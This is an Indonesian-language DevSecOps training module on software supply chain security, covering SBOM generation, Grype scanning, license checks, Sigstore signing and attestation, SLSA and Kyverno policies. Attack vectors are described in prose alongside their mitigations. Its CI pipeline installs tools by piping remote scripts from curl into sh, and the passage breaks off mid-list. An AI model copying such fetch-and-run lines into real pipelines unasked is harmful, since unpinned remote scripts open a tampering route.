# Bab 04 Modul 01: Software Supply Chain Security & Analisis Dependensi (SCA)

---

## 1. Identitas Modul

*   **Track:** DevSecOps
*   **Kategori:** 07-Quality-and-Security
*   **Bab:** 04 – Software Supply Chain Security & Dependency Management
*   **Modul:** 01 – Software Bill of Materials (SBOM), SCA, Cryptographic Signing & Attestation
*   **Tingkat Kesulitan:** Advanced / Enterprise
*   **Prasyarat:**
    *   Pemahaman mendalam mengenai arsitektur kontainer OCI (*Open Container Initiative*) dan runtime Docker/Containerd.
    *   Penguasaan *pipeline automation* (GitHub Actions, GitLab CI, atau Tekton).
    *   Pemahaman dasar kriptografi asimetris (kunci publik/privat, x509 certificates, PKI) dan protokol OpenID Connect (OIDC).
*   **Estimasi Waktu:** 240 Menit (Teori Mendalam, Analisis Kasus, dan Hands-on Lab Terpandu)

---

## 2. Learning Objectives

Setelah menyelesaikan modul ini, peserta didik ditargetkan mampu:

*   **LO-01:** Menganalisis topologi rantai pasok perangkat lunak (*software supply chain*) dan membedah vektor serangan modern yang menargetkan fase pengembangan hingga *deployment*.
*   **LO-02:** Menghasilkan, mengkaji, dan memvalidasi *Software Bill of Materials* (SBOM) dalam format standar industri (SPDX dan CycloneDX) menggunakan utilitas Syft.
*   **LO-03:** Mengintegrasikan mesin *Software Composition Analysis* (SCA) multi-sumber (Grype, Trivy, OSV-Scanner) ke dalam CI/CD pipeline dengan konfigurasi penegakan ambang batas kerentanan (*fail-on-threshold*).
*   **LO-04:** Mengidentifikasi dan mengotomatisasi mitigasi risiko kepatuhan lisensi (*license compliance*) pustaka sumber terbuka (copyleft vs. permissive).
*   **LO-05:** Mengimplementasikan paradigma *keyless signing* berbasis OIDC dan arsitektur Sigstore (Cosign, Fulcio, Rekor) untuk mengamankan integritas *artifact* kontainer.
*   **LO-06:** Mengkonstruksi dan memverifikasi *cryptographic attestation* rantai pasok berbasis kerangka kerja In-Toto untuk membuktikan validitas metadata build.
*   **LO-07:** Menilai serta menaikkan tingkat kematangan sistem *build* terhadap kerangka kerja SLSA (*Supply-chain Levels for Software Artifacts*) v1.0 hingga level Build L3.
*   **LO-08:** Mendesain kebijakan kontrol izin (*admission control*) pada Kubernetes menggunakan Kyverno untuk memvalidasi tanda tangan kriptografis dan keberadaan SBOM sebelum proses peluncuran Pod diizinkan.

---

## 3. Concept Map & Architecture Diagram

Berikut adalah arsitektur menyeluruh rantai pasok perangkat lunak modern yang menerapkan prinsip pertahanan berlapis (*defense-in-depth*), mencakup fase pembuatan kode sumber, otomatisasi build, penjaminan integritas, hingga penegakan kebijakan di tingkat runtime:

```
[ Developer Workstation ]
        │ (git commit -S: GPG / SSH Sign)
        ▼
[ Source Code Repo: GitHub / GitLab ]
        │ (Webhook Event: Tag / Release)
        ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ CI Runner Pipeline (Isolated Ephemeral Node)                                │
│                                                                             │
│  [1. Source Checkout] ──► [2. Build & Test] ──► [3. OCI Image Compilation]  │
│                                                        │                    │
│  ┌─────────────────────────────────────────────────────┘                    │
│  ▼                                                                          │
│  [4. SBOM Generation] (Syft) ────► [spdx.json / cyclonedx.json]             │
│  │                                         │                                │
│  ▼                                         ▼                                │
│  [5. SCA & License Audit] ◄────────────────┘                                │
│      (Grype / Trivy / OSV)                                                  │
│      ├── Vuln Severity >= HIGH? ──► [FAIL CI BUILD]                         │
│      └── Non-compliant License? ──► [FAIL CI BUILD]                         │
│                                                                             │
│  [6. Keyless Signing & Attestation] (Cosign)                                │
│      │                                                                      │
│      ├── OIDC Token Exchange ────► [Sigstore Fulcio: Ephemeral X.509 CA]    │
│      │                             (Mengeluarkan sertifikat valid 10 mnt)   │
│      │                                                                      │
│      ├── Sign Artifact & SBOM ───► [Sigstore Rekor: Transparency Log]       │
│                                    (Mencatat hash proof scr immutable)      │
│                                                                             │
│  [7. Publish Artifact & Attestations]                                       │
└───────────────────────┬─────────────────────────────────────────────────────┘
                        │
                        ▼
       [ Enterprise OCI Registry (Harbor / ECR / GHCR) ]
       ├── image:v1.0.0
       ├── image:v1.0.0.sig (Cosign Signature)
       └── image:v1.0.0.att (In-Toto Provenance / SBOM Attestation)
                        │
                        ▼
       [ Production Deployment: Kubernetes Cluster ]
                        │
       [ Kyverno / Gatekeeper Admission Controller ]
                        │
     ┌──────────────────┴──────────────────┐
     ▼                                     ▼
[ Verifikasi Gagal ]                  [ Verifikasi Lolos ]
├── Sertifikat Fulcio Tidak Valid?    ├── Signature Valid (Rekor verified)
├── Attestation SBOM Tidak Ada?       ├── In-Toto Predicate Provenance Sah
└── Tindakan: BLOKIR POD DEPLOYMENT   └── Tindakan: POD RUNNING SECURELY
```

---

## 4. Mengapa Ini Penting (Why & Business / Security Impact)

Rantai pasok perangkat lunak modern tidak lagi ditulis dari nol; faktanya, sekitar 80% hingga 90% dari basis kode aplikasi *cloud-native* saat ini tersusun dari pustaka sumber terbuka (*open-source software/OSS*) dan dependensi transitif. Pergeseran ini memindahkan fokus aktor ancaman: daripada membobol perimeter jaringan target yang dijaga ketat, penyerang lebih memilih mengompromikan satu dependensi hulu (*upstream*) yang digunakan oleh ribuan organisasi hilir (*downstream*).

### Dampak Keamanan & Bisnis

1.  **Ledakan Dampak Dependensi Transitif (*Transitive Blast Radius*):** Kerentanan zero-day pada pustaka tingkat rendah (seperti insiden Log4Shell CVE-2021-44228 pada Apache Log4j) menunjukkan bahwa sebuah komponen rekursif yang tidak diketahui keberadaannya oleh tim operasional dapat memicu eksekusi kode jarak jauh (*Remote Code Execution*) di ribuan sistem sekaligus.
2.  **Serangan Integritas Saluran Produksi (*Pipeline Tampering*):** Penyerang dapat menyusup ke lingkungan CI/CD untuk memodifikasi biner atau menginjeksi *backdoor* setelah kode diverifikasi oleh pengembang, namun sebelum paket dikemas ke dalam citra kontainer. Tanpa mekanisme *cryptographic provenance*, artefak berbahaya ini akan diperlakukan sebagai citra resmi.
3.  **Risiko Hukum & Finansial Akibat Pelanggaran Lisensi:** Pustaka pihak ketiga dengan lisensi *copyleft* agresif (seperti GPL-3.0 atau AGPL-3.0) yang masuk ke dalam perangkat lunak proprietary tanpa kontrol yang ketat dapat memaksa perusahaan merilis basis kode eksklusif ke publik atau menghadapi litigasi hak cipta dan denda finansial yang masif.
4.  **Kepatuhan Regulasi Global:** Mandat kepatuhan seperti US Executive Order 14028, NIST SP 800-218 (Secure Software Development Framework / SSDF), dan EU Cyber Resilience Act mewajibkan penyediaan SBOM yang tervalidasi secara kriptografis serta implementasi integritas rantai pasok untuk seluruh perangkat lunak yang beroperasi di sektor kritis.

---

## 5. Apa Itu Konsep (What & Definisi Formal Mendalam)

### Software Bill of Materials (SBOM)
SBOM adalah inventaris formal terstruktur mesin (*machine-readable inventory*) yang merinci seluruh komponen, metadata rantai pasok, informasi hierarki modul, dependensi langsung maupun dependensi transitif, serta hubungan lisensi dari sebuah artefak perangkat lunak. SBOM berfungsi sebagai "daftar bahan" digital yang memungkinkan deteksi cepat terhadap komponen rentan ketika kerentanan baru diumumkan.

### Software Composition Analysis (SCA)
SCA adalah proses inspeksi sistematis terhadap basis kode aplikasi, konfigurasi manajer paket, dan lapisan citra kontainer untuk mengidentifikasi keberadaan komponen pihak ketiga, melacak versi yang digunakan terhadap basis data kerentanan publik (seperti *National Vulnerability Database* / NVD dan *Open Source Vulnerabilities* / OSV), serta mengevaluasi risiko kepatuhan lisensi.

### Ekosistem Sigstore: Cosign, Fulcio, dan Rekor
Sigstore adalah kerangka kerja sumber terbuka di bawah Linux Foundation yang menyediakan standar tanda tangan digital bebas kunci (*keyless signing*):
*   **Cosign:** Utilitas CLI dan pustaka pemrograman untuk menandatangani, memverifikasi, dan mengunggah tanda tangan, SBOM, serta atestasi ke OCI registries.
*   **Fulcio:** Otoritas Sertifikat (*Certificate Authority* / CA) akar yang menerbitkan sertifikat x509 jangka pendek (*ephemeral certificates*, umumnya valid hanya 10-15 menit) berdasarkan verifikasi identitas pengembang atau sistem build melalui OpenID Connect (OIDC).
*   **Rekor:** Buku besar transparansi (*immutable transparency log*) terdistribusi berbasis Merkle Tree yang menyimpan bukti kriptografis bahwa sebuah tanda tangan dibuat pada rentang waktu validitas sertifikat Fulcio, memfasilitasi auditabilitas tanpa memerlukan kunci privat persisten.

### In-Toto Attestations
In-Toto adalah spesifikasi yang mendefinisikan skema metadata untuk memverifikasi integritas siklus hidup perangkat lunak. Atestasi In-Toto menghubungkan *Subject* (artefak yang dihasilkan) dengan sebuah *Predicate* (klaim atau bukti terperinci yang dibuat oleh sistem build, misalnya: *build provenance*, hasil pemindaian keamanan, atau isi SBOM) yang kemudian disegel secara kriptografis.

### Kerangka Kerja SLSA (Supply-chain Levels for Software Artifacts)
SLSA (diucapkan "salsa") adalah kerangka kerja berbasis konsensus yang menetapkan standar integritas untuk melindungi kode dari manipulasi sumber, build, dan distribusi. SLSA v1.0 mendefinisikan tingkatan kematangan (Build L1 hingga Build L3) dengan persyaratan isolasi lingkungan build (*hermetic/ephemeral*), auditabilitas sumber kode, dan pencegahan modifikasi build dari luar sistem yang berwenang.

---

## 6. Bagaimana Cara Kerjanya (How & Mekanika Internal Arsitektur)

### A. Mekanika Ekstraksi Dependensi pada SBOM (Syft)
Syft mengekstraksi dependensi melalui dua mekanisme utama:
1.  **Analisis Manifest & Lockfile:** Memindai file manifes statis (misal: `package-lock.json`, `pom.xml`, `go.mod`, `Cargo.lock`) dan mengurai struktur relasi dependensi secara deterministik.
2.  **Analisis Heuristik Layer OCI:** Membongkar tiap lapisan (*tarball layer*) citra kontainer OCI secara terpisah, memeriksa keberadaan database sistem operasi paket (seperti `/var/lib/dpkg/status` di Debian/Ubuntu, `/lib/apk/db/installed` di Alpine, atau `/var/lib/rpm/Packages` di Red Hat), serta file binari statis yang telah dikompilasi (Go/Rust binary scanning via DWARF table parsing). Hasil ekstraksi dipetakan ke spesifikasi SPDX atau CycloneDX lengkap dengan hash kriptografis (`SHA-256`) setiap file.

### B. Mekanisme Keyless Signing dengan Sigstore
Pendekatan konvensional mengharuskan pengelolaan kunci privat (*private keys*) jangka panjang yang berisiko tinggi bocor dari CI Runner. Arsitektur *keyless* menghilangkan kebutuhan kunci privat statis melalui mekanisme berikut:

```
[ CI/CD Environment ]         [ Fulcio CA ]              [ OIDC Provider ]         [ Rekor Log ]
         │                          │                            │                       │
 1. Generate Ephemeral              │                            │                       │
    Keypair (In-Memory)             │                            │                       │
         │                          │                            │                       │
 2. Minta OIDC Token ───────────────┼───────────────────────────►│                       │
         │                          │                            │                       │
 3. Terima OIDC ID Token ◄──────────┼────────────────────────────┘                       │
    (Claims: workflow, repo, ref)   │                                                    │
         │                          │                                                    │
 4. Kirim CSR + OIDC Token ────────►│                                                    │
         │                          │                                                    │
         │                  5. Validasi OIDC Token                                       │
         │                     Ekstrak Identitas                                         │
         │                     Terbitkan Sertifikat                                      │
         │                     X.509 Ephemeral (10 Menit)                                │
         │                          │                                                    │
 6. Terima X.509 Certificate ◄──────┘                                                    │
         │                                                                               │
 7. Tanda tangani Hash Artefak                                                           │
    menggunakan Private Key                                                              │
         │                                                                               │
 8. Hancurkan Private Key dari Memori                                                    │
         │                                                                               │
 9. Kirim Hash Artefak + Signature + Cert ke Rekor ─────────────────────────────────────►│
         │                                                                               │
         │                                                                       10. Simpan di Merkle
         │                                                                           Tree & Terbitkan SET
         │                                                                           (Signed Entry Timestamp)
         │                                                                               │
11. Terima SET Proof ◄───────────────────────────────────────────────────────────────────┘
```

Saat proses verifikasi dijalankan di kemudian hari:
1.  Verifikator membaca sertifikat x509 publik yang dilampirkan pada artefak.
2.  Verifikator memverifikasi bahwa tanda tangan dibuat oleh kunci privat yang cocok dengan kunci publik di sertifikat.
3.  Verifikator mencocokkan rekaman ke **Rekor Transparency Log** untuk membuktikan bahwa tanda tangan tersebut dibubuhkan tepat pada jendela waktu ketika sertifikat x509 yang berumur 10 menit tersebut masih aktif.
4.  Jika stempel waktu Rekor (*Signed Entry Timestamp* / SET) cocok dan identitas OIDC (misal: `https://github.com/my-org/my-repo/.github/workflows/deploy.yml@refs/heads/main`) sesuai dengan kebijakan, maka artefak dinyatakan autentik dan bebas dari pemalsuan.

---

## 7. Perbandingan Paradigma / Taksonomi Matriks

### Tabel 1: Format Standar SBOM (SPDX vs CycloneDX)

| Parameter Evaluasi | SPDX (Software Package Data Exchange) | CycloneDX |
| :--- | :--- | :--- |
| **Organisasi Pengembang** | Linux Foundation (ISO/IEC 5962:2021) | OWASP Foundation |
| **Fokus Desain Utama** | Kepatuhan lisensi, standarisasi internasional, dokumentasi legalitas kode | Rekayasa keamanan aplikasi, analisis kerentanan, integrasi DevSecOps |
| **Dukungan Format File** | JSON, YAML, Tag:Value, RDF/XML, Spreadsheet | JSON, XML, Protocol Buffers |
| **Representasi Vulnerability (VEX)** | Didukung via ekstensi (*Vulnerability Exploitability eXchange*) | Terintegrasi secara native sejak spesifikasi awal (BOM-format VEX) |
| **Karakteristik Layak Guna** | Ideal untuk audit legal korporasi dan pengadaan perangkat lunak pemerintah | Ideal untuk otomasi CI/CD, korelasi CVE harian, dan analisis ancaman siber |

### Tabel 2: Pemindai Kerentanan SCA (Trivy vs Grype vs OSV-Scanner)

| Fitur / Parameter | Aquasec Trivy | Anchore Grype | Google OSV-Scanner |
| :--- | :--- | :--- | :--- |
| **Metode Pemindaian** | Layer Kontainer, FS, Repositori Git, Manifes K8s, VM Image | Manifes aplikasi, Layer Kontainer, SBOM (SPDX/CycloneDX) | Manifes dependensi, Git Commit Hashes, Direktori Proyek |
| **Sumber Database Vuln** | NVD, Red Hat, Debian, Alpine, GitHub Security Advisories | NVD, Red Hat, Ubuntu, Alpine, GHSA, Arch Linux | Open Source Vulnerabilities (OSV.dev) API |
| **Akurasi Pemindaian SBOM** | Sangat Baik (dapat memindai file SBOM mandiri) | Luar Biasa (dirancang khusus bekerja optimal bersama Syft) | Terbatas pada ekosistem open source yang terdaftar di OSV |
| **Konsumsi Resource** | Sedang (mengunduh basis data lokal yang cukup besar) | Rendah (pembaruan database terkompresi cepat) | Sangat Ringan (berbasis query API / DB parsial) |
| **Pendeteksian Lisensi** | Ya, native | Terbatas (fokus utama pada CVE/GHSA) | Tidak (fokus eksklusif pada kerentanan OSV) |

### Tabel 3: Penandatanganan Artefak (Kunci Privat Statis vs Keyless Sigstore)

| Parameter | Traditional PKI / GPG Static Keys | Sigstore Keyless Architecture |
| :--- | :--- | :--- |
| **Manajemen Kunci** | Kunci privat disimpan di CI Secrets atau HSM; rotasi manual rumit | Tidak ada kunci privat statis; dibuat sementara di memori (*ephemeral*) |
| **Risiko Kebocoran** | Tinggi (kebocoran variabel CI mengekspos kunci selamanya) | Nihil (kunci dihancurkan milidetik setelah digunakan) |
| **Identitas Penandatangan** | Terikat pada Key ID / Sertifikat statis yang rentan kadaluarsa | Terikat langsung pada identitas OIDC (aktor, repositori, alur kerja) |
| **Audit Integritas Waktu** | Memerlukan *Time Stamping Authority* (TSA) RFC 3161 terpisah | Terintegrasi langsung via Rekor Transparency Log (Merkle Tree) |

---

## 8. Analisis Mendalam Attack Surface & Vector Matrix

```
[ Source Repo ] ──(Attack 1)──► [ Build Pipeline ] ──(Attack 2)──► [ Registry ] ──(Attack 3)──► [ Cluster ]
       │                               │                                │
  (Attack 4)                      (Attack 5)                       (Attack 6)
       ▼                               ▼                                ▼
[ Upstream Registry ]            [ Build Node ]                  [ Metadata Store ]
```

| ID Vektor | Vektor Serangan | Titik Masuk (*Entry Point*) | Mekanika Eksploitasi | Dampak (*Impact*) | Strategi Mitigasi Arsitektur |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **ATK-01** | Dependency Confusion | Sistem resolusi paket publik vs privat (NPM, PyPI, Maven) | Penyerang mendaftarkan nama pustaka internal perusahaan di registry publik dengan versi lebih tinggi (misal `internal-auth` v99.0.0). Package manager CI/CD otomatis mengunduh pustaka berbahaya tersebut. | Arbitrary Code Execution (RCE) di lingkungan build CI dan runtime produksi. | Konfigurasi scoped registries, namespace reservation di publik, penggunaan local caching proxy (Artifactory, Nexus). |
| **ATK-02** | Typosquatting | Human input / Penulisan dependensi manual | Penyerang mengunggah pustaka dengan nama mirip paket populer (misal `reqeusts` alih-alih `requests`). Pengembang salah mengetik nama di file manifes. | Injeksi trojan downloader, pencurian kredensial environment runner. | SCA scanning berkala, validasi integritas via *Lockfile* yang terkunci (`integrity hash`). |
| **ATK-03** | CI Pipeline In-line Tampering | Kompromi runner / script eksternal via `curl \| bash` | Penyerang memodifikasi biner yang dihasilkan atau file konfigurasi tepat setelah proses kompilasi selesai, namun sebelum pembuatan citra kontainer. | Citra kontainer berjalan di kluster dengan muatan berbahaya, lolos dari peninjauan kode sumber. | Penggunaan SLSA L3 build hermetik, tanda tangan *Provenance* otomatis via In-Toto attestations. |
| **ATK-04** | Account Takeover Maintainer Upstream | Pembajakan kredensial pengembang open-source | Penyerang mengambil alih akun pengembang pustaka upstream yang sah melalui credential stuffing atau phishing, lalu merilis pembaruan sah berisi backdoor. | Backdoor terdistribusi ke seluruh pengguna pustaka secara global tanpa disadari. | Pengecekan reputasi repositori (OpenSSF Scorecard), *dependency pinning* menggunakan SHA commit hash, bukan tag. |
| **ATK-05** | Man-in-the-Middle Registry Tampering | Jalur komunikasi tidak aman / Registry tanpa auth | Penyerang menimpa tag citra kontainer (misal: `:latest` atau `:v1.0.0`) di registry publik/privat dengan citra yang telah dimodifikasi. | Runtime cluster mengeksekusi citra yang telah disusupi penyerang tanpa peringatan. | Larang penggunaan tag yang dapat berubah (*mutable tags*); wajibkan penarikan citra via *Digest Immutable* (`sha256:...`) dan tanda tangan Cosign. |
| **ATK-06** | License Poisoning (Copyleft Injection) | Dependensi transitif tidak terverifikasi | Komponen baru dimasukkan ke basis kode dengan dependensi transitif berlisensi AGPL-3.0 atau SSPL. | Pelanggaran hukum hak kekayaan intelektual; risiko kewajiban membuka source code perusahaan ke publik. | Validasi lisensi otomatis di CI menggunakan pemindai kepatuhan lisensi yang memblokir build pada pelanggaran lisensi fatal. |

---

## 9. Code Example Sederhana (Minimal & Clear)

Berikut adalah skrip shell otomasi lokal yang menunjukkan alur berurutan: mengompilasi citra, mengekstrak SBOM format CycloneDX menggunakan Syft, melakukan audit keamanan berbasis dependensi dengan Grype, dan memverifikasi integritasnya.

```bash
#!/usr/bin/env bash
# ==============================================================================
# Script: supply-chain-baseline.sh
# Deskripsi: Generasi SBOM, Analisis SCA, dan Demonstrasi Tanda Tangan Dasar
# ==============================================================================
set -euo pipefail

TARGET_IMAGE="my-app:1.0.0"
DOCKERFILE_PATH="./Dockerfile"

# 1. Bangun Kontainer Minimal
echo "[+] Tahap 1: Membangun kontainer minimal berbasis Alpine..."
docker build -t "${TARGET_IMAGE}" -f - . <<EOF
FROM alpine:3.18
RUN apk add --no-cache curl=8.5.0-r0 openssl=3.1.4-r1
WORKDIR /app
COPY . .
EOF

# 2. Hasilkan SBOM menggunakan Syft dalam Format CycloneDX JSON
echo "[+] Tahap 2: Mengekstraksi SBOM dengan Syft..."
syft packages "${TARGET_IMAGE}" -o cyclonedx-json=bom.json

# Verifikasi keberadaan file SBOM dan tampilkan ringkasan 5 dependensi pertama
echo "[+] Verifikasi SBOM: Ditemukan $(jq '.components | length' bom.json) komponen."
jq '.components[0:3][] | {name: .name, version: .version, purl: .purl}' bom.json

# 3. Pindai Kerentanan pada SBOM Menggunakan Grype
echo "[+] Tahap 3: Memindai kerentanan dependensi pada SBOM via Grype..."
# Grype akan mengevaluasi bom.json dan gagal (exit 1) jika ditemukan CVE kritis
grype sbom:./bom.json --fail-on critical

echo "[+] Analisis Selesai: Tidak ada kerentanan CRITICAL yang terdeteksi pada SBOM."
```

---

## 10. Code Example Lanjutan (Production-Ready / Hardening)

Berikut adalah alur kerja CI/CD enterprise lengkap menggunakan GitHub Actions. Pipeline ini mencakup:
1.  Pembangunan citra kontainer OCI.
2.  Pembuatan SBOM CycloneDX menggunakan Syft.
3.  Audit kerentanan via Grype dengan ambang batas kepatuhan.
4.  Penandatanganan citra kontainer secara *Keyless* menggunakan Sigstore Cosign dan identitas OIDC GitHub.
5.  Penerbitan *cryptographic attestation* terhadap file SBOM langsung ke repositori OCI (GHCR).

```yaml
name: Enterprise Software Supply Chain Security Pipeline

on:
  push:
    branches:
      - main
    tags:
      - 'v*.*.*'

permissions:
  contents: read
  packages: write
  id-token: write # KRITIKAL: Diperlukan untuk meminta token OIDC dari Sigstore Fulcio

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build-secure-publish:
    name: Build, SBOM, Scan & Keyless Attestation
    runs-on: ubuntu-latest

    steps:
      - name: 1. Hardened Checkout Code
        uses: actions/checkout@v4
        with:
          persist-credentials: false

      - name: 2. Setup Cosign (Sigstore)
        uses: sigstore/cosign-installer@v3.4.0

      - name: 3. Setup Syft & Grype Tools
        run: |
          curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin
          curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

      - name: 4. Log in to Container Registry (GHCR)
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: 5. Extract Metadata for Container
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=semver,pattern={{version}}
            type=sha,format=long

      - name: 6. Build and Push Container Image by Digest
        id: build-push
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}

      - name: 7. Generate Machine-Readable SBOM (CycloneDX & SPDX)
        run: |
          IMAGE_DIGEST="${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build-push.outputs.digest }}"
          echo "Generating SBOM for ${IMAGE_DIGEST}..."
          
          # Hasilkan format CycloneDX JSON untuk analisis keamanan
          syft packages "${IMAGE_DIGEST}" -o cyclonedx-json=cyclonedx.json
          
          # Hasilkan format SPDX JSON untuk kepatuhan legal
          syft packages "${IMAGE_DIGEST}" -o spdx-json=spdx.json

      - name: 8. Execute SCA Vulnerability Scanning on SBOM (Fail on CRITICAL)
        run: |
          # Gagalkan build jika ditemukan kerentanan berstatus CRITICAL
          # Abaikan kerentanan yang belum memiliki patch/fix jika dikonfigurasi demikian
          grype sbom:./cyclonedx.json \
            --fail-on critical \
            --only-fixed \
            -o table

      - name: 9. Execute License Compliance Validation
        run: |
          echo "Memverifikasi kepatuhan lisensi OSS..."
          # Ekstrak lisensi dari SBOM SPDX dan cari lisensi copyleft agresif (misal: GPL/AGPL)
          FORBIDDEN_LICENSES=("GPL-3.0" "AGPL-3.0" "SSPL")
          for lic in "${FORBIDDEN_LICENSES[@]}"; do
            if jq -e ".packages[].licenseConcluded | select(. != null) | contains(\"$lic\")" spdx.json > /dev/null; then
              echo "CRITICAL ERROR: Ditemukan dependensi dengan lisensi terlarang ($lic)!"
              exit 1
            fi
          done
          echo "Validasi lisensi berhasil: Seluruh dependensi memenuhi kualifikasi kepatuhan."

      - name: 10. Keyless Signing Artifact via Sigstore (Fulcio & Rekor)
        run: |
          IMAGE_DIGEST="${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build-push.outputs.digest }}"
          echo "Menandatangani citra kontainer secara keyless..."
          
          # Cosign memanfaatkan lingkungan GitHub Actions OIDC token secara native
          cosign sign --yes "${IMAGE_DIGEST}"

      - name: 11. Attach Cryptographic Attestation (SBOM) via Cosign & In-Toto
        run: |
          IMAGE_DIGEST="${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build-push.outputs.digest }}"
          echo "Menerbitkan In-Toto Attestation untuk SBOM..."
          
          # Pasang SBOM CycloneDX sebagai atestasi terverifikasi ke dalam repositori OCI
          cosign attest --yes \
            --predicate ./cyclonedx.json \
            --type cyclonedx \
            "${IMAGE_DIGEST}"

      - name: 12. Audit Verification Check (Self-Check Test)
        run: |
          IMAGE_DIGEST="${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build-push.outputs.digest }}"
          echo "Memvalidasi tanda tangan dari buku besar Rekor..."
          
          # Validasi bahwa tanda tangan benar-benar terdaftar di Rekor dan berasal dari workflow ini
          cosign verify \
            --certificate-identity "https://github.com/${{ github.repository }}/.github/workflows/pipeline.yml@refs/heads/main" \
            --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
            "${IMAGE_DIGEST}"
```

---

## 11. Diagram Alur Serangan & Mitigasi (ASCII Art)

Diagram di bawah ini mengilustrasikan perbandingan antara serangan infiltrasi build (serupa insiden SolarWinds/Codecov) melawan arsitektur rantai pasok yang diperkuat dengan Sigstore, SBOM, dan In-Toto Attestation:

```
SKENARIO SERANGAN TANPA VERIFIKASI RANTAI PASOK:
[ Developer ] ──► [ Git Commit: OK ] ──► [ Build Runner ] ──( Infiltrasi / Backdoor )
                                                │
                                                ▼ (Injeksi Kode Diam-diam)
                                         [ Biner Tercemar ]
                                                │
                                                ▼ (Push ke Registry)
                                         [ OCI Registry: Tag v1.0 ]
                                                │
                                                ▼ (K8s menarik tag tanpa validasi)
                                    [ Production Cluster: RCE Eksploitasi Terjadi ]


SKENARIO TERLINDUNGI DENGAN SIGSTORE + SLSA + ADMISSION CONTROL:
[ Developer ] ──► [ Git Commit: Signed ] ──► [ Build Runner Ephemeral ]
                                                     │
               ┌─────────────────────────────────────┴─────────────────────────────────────┐
               ▼                                                                           ▼
     [ Kompilasi OCI Image ]                                                     [ Ekstraksi SBOM: Syft ]
               │                                                                           │
               │                                                                 [ SCA Audit: Grype ]
               │                                                                           │
               ▼                                                                           ▼
      (Image SHA: 0xABCD...)                                                     (cyclonedx-sbom.json)
               │                                                                           │
               └───────────────────────────────────┬───────────────────────────────────────┘
                                                   ▼
                              [ Sign & Attest via Cosign Keyless ]
                              ├── Fulcio: Menerbitkan ephemeral cert via OIDC
                              └── Rekor: Mencatat bukti signature ke Merkle Log
                                                   │
                                                   ▼
                         [ Push: Image + Signature + SBOM Attestation ]
                                                   │
                                                   ▼
                                  [ Admission Controller: Kyverno ]
                                                   │
                  ┌────────────────────────────────┴────────────────────────────────┐
                  ▼                                                                 ▼
      [ Signature Hilang / Cert Invalid ]                        [ Signature & SBOM Tervalidasi ]
      └── Rekor Log tidak cocok!                                 ├── Issuer: GitHub OIDC sah
      └── Atestasi SBOM tidak ditemukan!                         ├── Rekor SET: Verified
      └── AKSI: BLOKIR DEPLOYMENT                                └── AKSI: PERBOLEHKAN POD BERJALAN
```

---

## 12. Trade-offs & Security vs. Usability / Performance

1.  **Pipeline Execution Latency vs. Thorough Vulnerability Scanning:**
    *   *Trade-off:* Pemindaian deep SCA (menganalisis seluruh lapisan citra, unpacking layer, dan verifikasi hash) menambah waktu eksekusi CI/CD antara 2 hingga 8 menit per build.
    *   *Mitigasi:* Implementasikan caching lokal untuk basis data kerentanan Grype/Trivy pada CI Runner menggunakan cache persistence, dan jalankan pemindaian mendalam secara paralel dengan integrasi pengujian fungsional.
2.  **Strict Enforcement (*Fail-on-High/Critical*) vs. Developer Velocity:**
    *   *Trade-off:* Memblokir build pada kerentanan *HIGH* seringkali menghentikan proses perilisan perangkat lunak akibat kerentanan yang belum memiliki perbaikan (*unfixed/no-fix-available*) atau tidak dapat dieksploitasi dalam konteks kode aplikasi (*unreachable code*).
    *   *Mitigasi:* Gunakan dokumen VEX (*Vulnerability Exploitability eXchange*) untuk menandai kerentanan yang telah dikaji dengan status `not_affected` secara transparan tanpa mengubah ambang batas pemindai.
3.  **Keyless Ephemeral Signing vs. Air-Gapped Environments:**
    *   *Trade-off:* Sigstore keyless bergantung pada akses internet publik ke Fulcio CA, penyedia OIDC, dan Rekor public transparency log. Sistem di dalam lingkungan *air-gapped* murni tidak dapat memanfaatkan infrastruktur publik ini.
    *   *Mitigasi:* Bangun implementasi Sigstore internal (*private Sigstore instance*) di dalam jaringan lokal perusahaan, atau gunakan Cosign dengan pasangan kunci privat statis yang tersimpan di HSM (*Hardware Security Module*) lokal yang mendukung KMS.

---

## 13. Edge Cases & Complex Failure Modes

1.  **Divergensi Resolusi Dependensi Transitif Dinamis (*Floating Versions*):**
    *   *Kondisi:* File manifes (`package.json`) mendefinisikan dependensi dengan awalan dinamis (seperti `^1.2.0`). Jika pengembang tidak mengunci dependensi menggunakan lockfile (`package-lock.json`), pustaka yang ditarik saat build CI lokal dapat berbeda versinya dengan yang ditarik saat build CI produksi beberapa hari kemudian.
    *   *Dampak:* SBOM yang dihasilkan saat build lokal menjadi tidak representatif terhadap artefak produksi, menciptakan celah evaluasi kerentanan (*blind spot*).
2.  **Kegagalan Validasi Jendela Waktu Sertifikat Ephemeral (*Time Drift / Skew*):**
    *   *Kondisi:* Fulcio menerbitkan sertifikat x509 yang hanya valid selama 10 menit. Jika terjadi *latency* jaringan tinggi antara CI Runner, OCI Registry, dan Rekor, atau jika jam sistem (*system clock*) pada runner mengalami desinkronisasi (*time drift* > 300 detik), transaksi ke Rekor dapat ditolak karena sertifikat dianggap kadaluarsa.
    *   *Dampak:* Proses penandatanganan gagal total dan memblokir seluruh rantai perilisan produksi.
3.  **Dependensi Tautan Statis Multi-Tahap (*Multi-stage Compilation Masking*):**
    *   *Kondisi:* Citra kontainer akhir dibangun menggunakan pola `FROM scratch` atau `FROM distroless` di mana biner Go atau C++ dikompilasi secara statis pada *builder stage* pertama, lalu disalin tanpa file manifes paket pendukung.
